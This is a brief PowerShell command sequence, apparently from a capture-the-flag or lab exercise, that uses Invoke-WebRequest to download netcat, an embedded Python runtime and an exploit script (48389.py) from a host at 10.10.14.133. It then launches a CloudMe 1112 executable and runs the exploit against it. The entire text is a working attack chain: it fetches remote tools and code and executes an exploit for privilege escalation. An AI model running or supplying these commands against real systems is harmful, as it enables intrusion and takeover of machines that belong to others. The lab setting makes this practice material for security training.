iwr http://10.10.14.133:8000/_nc.exe -OutFile _nc.exe
iwr http://10.10.14.133:8000/python-3.5.2-embed-amd64.zip -o python-3.5.2-embed-amd64.zip
Expand-Archive python-3.5.2-embed-amd64.zip python
cd python
iwr http://10.10.14.133:8000/48389.py -OutFile x.py
C:\Users\shaun\Downloads\CloudMe_1112.exe
Start-Sleep -s 15
.\python.exe .\x.py
cd ..
